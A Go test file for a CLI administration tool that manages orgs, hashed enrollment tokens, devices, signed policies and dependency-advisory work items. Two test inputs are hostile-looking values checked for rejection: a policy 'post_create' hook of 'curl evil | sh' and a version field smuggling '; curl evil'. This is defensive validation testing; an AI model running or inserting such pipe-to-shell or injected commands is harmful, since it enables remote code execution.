package main

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/sushidev-team/lola/hub/internal/store"
	"github.com/sushidev-team/lola/hubproto"
)

type harness struct {
	t    *testing.T
	dir  string
	data string
}

func newHarness(t *testing.T) *harness {
	dir := t.TempDir()
	return &harness{t: t, dir: dir, data: filepath.Join(dir, "hub.json")}
}

func (h *harness) run(args ...string) (int, string, string) {
	var out, errb bytes.Buffer
	c := &cli{stdout: &out, stderr: &errb, getenv: func(k string) string {
		if k == "LOLA_HUB_DATA" {
			return h.data
		}
		return ""
	}}
	code := c.run(args)
	return code, out.String(), errb.String()
}

func (h *harness) ok(args ...string) string {
	h.t.Helper()
	code, out, errs := h.run(args...)
	if code != 0 {
		h.t.Fatalf("%v: exit %d: %s", args, code, errs)
	}
	return out
}

func (h *harness) fails(args ...string) string {
	h.t.Helper()
	code, _, errs := h.run(args...)
	if code == 0 {
		h.t.Fatalf("%v: expected failure", args)
	}
	return errs
}

func TestAdminFlow(t *testing.T) {
	h := newHarness(t)
	h.ok("admin", "org", "create", "acme")
	h.fails("admin", "org", "create", "acme")
	h.fails("admin", "org", "create", "Bad Name")

	tok := strings.TrimSpace(h.ok("admin", "enroll", "create", "--org", "acme", "--ttl", "2h"))
	h.fails("admin", "enroll", "create", "--org", "nope")
	st, err := store.Open(h.data)
	if err != nil {
		t.Fatal(err)
	}
	_ = st.View(func(d *store.Data) error {
		tk := d.Tokens[store.HashToken(tok)]
		if tk == nil || tk.Org != "acme" {
			t.Fatal("token not stored hashed")
		}
		raw, _ := os.ReadFile(h.data)
		if bytes.Contains(raw, []byte(tok)) {
			t.Fatal("plaintext token in store")
		}
		return nil
	})

	// Simulate an enrolled device holding a lease, then revoke it.
	pub, _, _ := hubproto.GenerateKey()
	devID := hubproto.DeviceID(pub)
	_ = st.Update(func(d *store.Data) error {
		d.Devices[devID] = &store.Device{ID: devID, Org: "acme", Name: "x", PublicKey: hubproto.EncodePublicKey(pub)}
		d.Items["i1"] = &store.WorkItem{ID: "i1", Org: "acme", State: hubproto.StateClaimed,
			Item:  hubproto.Item{Kind: hubproto.KindRedBumpPR, RedBumpPR: &hubproto.RedBumpPR{Repo: "acme/web", PR: 1, Branch: "b", Package: "p", Author: hubproto.AuthorRenovate}},
			Lease: &hubproto.Lease{ItemID: "i1", Device: devID, Expires: time.Now().Add(time.Hour)}}
		return nil
	})
	if out := h.ok("admin", "devices", "list"); !strings.Contains(out, devID) {
		t.Fatalf("devices list: %s", out)
	}
	if out := h.ok("admin", "devices", "revoke", devID); !strings.Contains(out, "reopened 1") {
		t.Fatalf("revoke: %s", out)
	}
	h.fails("admin", "devices", "revoke", devID)
	if out := h.ok("admin", "items", "list", "--state", "open"); !strings.Contains(out, "i1") {
		t.Fatalf("items list: %s", out)
	}
	h.fails("admin", "items", "list", "--state", "bogus")
	if out := h.ok("admin", "events", "list"); !strings.Contains(out, "device_revoked") {
		t.Fatalf("events: %s", out)
	}

	// Per-org Linear team.
	h.ok("admin", "org", "linear", "acme", "--team", "3f2a-team")
	h.fails("admin", "org", "linear", "acme")
	h.fails("admin", "org", "linear", "acme", "--team", "bad team")
	h.fails("admin", "org", "linear", "nope", "--team", "t")
	if out := h.ok("admin", "org", "list"); !strings.Contains(out, "3f2a-team") {
		t.Fatalf("org list: %s", out)
	}
	h.ok("admin", "org", "linear", "acme", "--clear")
	st2, _ := store.Open(h.data)
	_ = st2.View(func(d *store.Data) error {
		if d.Orgs["acme"].LinearTeam != "" {
			t.Fatal("team not cleared")
		}
		return nil
	})

	// Purge.
	h.fails("admin", "items", "purge")
	h.fails("admin", "items", "purge", "--org", "acme")
	h.fails("admin", "items", "purge", "nope")
	if out := h.ok("admin", "items", "purge", "--org", "acme", "--state", "done"); !strings.Contains(out, "purged 0") {
		t.Fatalf("purge none: %s", out)
	}
	if out := h.ok("admin", "items", "purge", "i1"); !strings.Contains(out, "purged 1") {
		t.Fatalf("purge: %s", out)
	}
	if out := h.ok("admin", "items", "list"); strings.Contains(out, "i1") {
		t.Fatalf("item not purged: %s", out)
	}
}

func TestPolicyKeygenSignPublish(t *testing.T) {
	h := newHarness(t)
	h.ok("admin", "org", "create", "acme")
	keyFile := filepath.Join(h.dir, "admin.key")
	out := h.ok("policy", "keygen", "--out", keyFile)
	h.fails("policy", "keygen", "--out", keyFile) // never overwrites
	st, _ := os.Stat(keyFile)
	if st.Mode().Perm() != 0o600 {
		t.Fatalf("key mode %v", st.Mode().Perm())
	}
	var kid, pub string
	for _, line := range strings.Split(out, "\n") {
		if v, ok := strings.CutPrefix(line, "key_id:"); ok {
			kid = strings.TrimSpace(v)
		}
		if v, ok := strings.CutPrefix(line, "public_key:"); ok {
			pub = strings.TrimSpace(v)
		}
	}

	unsigned := filepath.Join(h.dir, "policy.json")
	write := func(version int, extra string) {
		body := `{"org":"acme","version":` + itoa(version) + `,"issued_at":"0001-01-01T00:00:00Z","settings":{"escalate_after":3` + extra + `},"key_id":""}`
		if err := os.WriteFile(unsigned, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write(1, `,"post_create":"curl evil | sh"`)
	h.fails("policy", "sign", "--key", keyFile, unsigned)

	write(1, "")
	signed := filepath.Join(h.dir, "signed.json")
	h.ok("policy", "sign", "--key", keyFile, "--out", signed, unsigned)

	// No keys registered yet: publish refuses.
	h.fails("admin", "policy", "publish", signed)
	h.ok("admin", "policy", "keys", "add", "--org", "acme", "--key-id", kid, "--public-key", pub)
	h.ok("admin", "policy", "publish", signed)
	h.fails("admin", "policy", "publish", signed) // not newer

	// Tampering breaks the signature.
	raw, _ := os.ReadFile(signed)
	var p hubproto.Policy
	_ = json.Unmarshal(raw, &p)
	p.Version, p.Settings.EscalateAfter = 9, 20
	tampered, _ := json.Marshal(p)
	tf := filepath.Join(h.dir, "tampered.json")
	_ = os.WriteFile(tf, tampered, 0o644)
	h.fails("admin", "policy", "publish", tf)

	// A key not registered for the org is refused.
	other := filepath.Join(h.dir, "other.key")
	h.ok("policy", "keygen", "--out", other)
	write(2, "")
	h.ok("policy", "sign", "--key", other, "--out", signed, unsigned)
	h.fails("admin", "policy", "publish", signed)

	write(2, "")
	h.ok("policy", "sign", "--key", keyFile, "--out", signed, unsigned)
	h.ok("admin", "policy", "publish", signed)
	s, _ := store.Open(h.data)
	_ = s.View(func(d *store.Data) error {
		if pol := d.Orgs["acme"].Policy; pol == nil || pol.Version != 2 || pol.Settings.EscalateAfter != 3 {
			t.Fatalf("stored policy %+v", pol)
		}
		return nil
	})
}

func itoa(n int) string {
	b, _ := json.Marshal(n)
	return string(b)
}

func TestUsageErrors(t *testing.T) {
	h := newHarness(t)
	if code, _, _ := h.run(); code != 2 {
		t.Fatalf("no args: %d", code)
	}
	if code, _, _ := h.run("bogus"); code != 2 {
		t.Fatalf("bogus: %d", code)
	}
	if code, _, _ := h.run("serve", "--tls-cert", "x"); code != 2 {
		t.Fatalf("half tls: %d", code)
	}
	if code, out, _ := h.run("help"); code != 0 || !strings.Contains(out, "admin enroll create") {
		t.Fatal("help")
	}
	// A help request where a group expects its noun or verb prints the usage
	// and succeeds, instead of "unknown command" and exit 2.
	for _, args := range [][]string{
		{"admin", "--help"}, {"admin", "org", "-h"}, {"policy", "--help"}, {"policy", "help"},
	} {
		if code, out, errs := h.run(args...); code != 0 || !strings.Contains(out, "policy keygen") || errs != "" {
			t.Errorf("%v: exit %d, stderr %q", args, code, errs)
		}
	}
}

func TestItemsAdd(t *testing.T) {
	h := newHarness(t)
	h.ok("admin", "org", "create", "acme")
	out := h.ok("admin", "items", "add", "--org", "acme", "--kind", "dep_advisory", "--repo", "acme/web",
		"--ecosystem", "npm", "--package", "lodash", "--vulnerable", "< 4.17.21", "--fixed", "4.17.21",
		"--advisory", "GHSA-jf85-cpcp-j695", "--severity", "high")
	if !strings.HasPrefix(out, "added dep_advisory i") {
		t.Fatalf("add: %q", out)
	}
	if out := h.ok("admin", "items", "add", "--org", "acme", "--kind", "dep_advisory", "--repo", "acme/web",
		"--ecosystem", "npm", "--package", "lodash", "--vulnerable", "< 4.17.21", "--fixed", "4.17.21",
		"--advisory", "GHSA-jf85-cpcp-j695", "--severity", "high"); !strings.Contains(out, "already known") {
		t.Fatalf("re-add: %q", out)
	}
	h.ok("admin", "items", "add", "--org", "acme", "--kind", "red_bump_pr", "--repo", "acme/web",
		"--pr", "12", "--branch", "dependabot/npm/lodash-4.17.21", "--package", "lodash")
	h.fails("admin", "items", "add", "--org", "acme", "--kind", "dep_advisory", "--repo", "acme/web",
		"--ecosystem", "npm", "--package", "lodash", "--vulnerable", "< 4.17.21; curl evil", "--advisory", "GHSA-jf85-cpcp-j695", "--severity", "high")
	h.fails("admin", "items", "add", "--kind", "dep_advisory")
	if list := h.ok("admin", "items", "list", "--org", "acme"); strings.Count(list, "acme/web") != 2 {
		t.Fatalf("list: %s", list)
	}
}
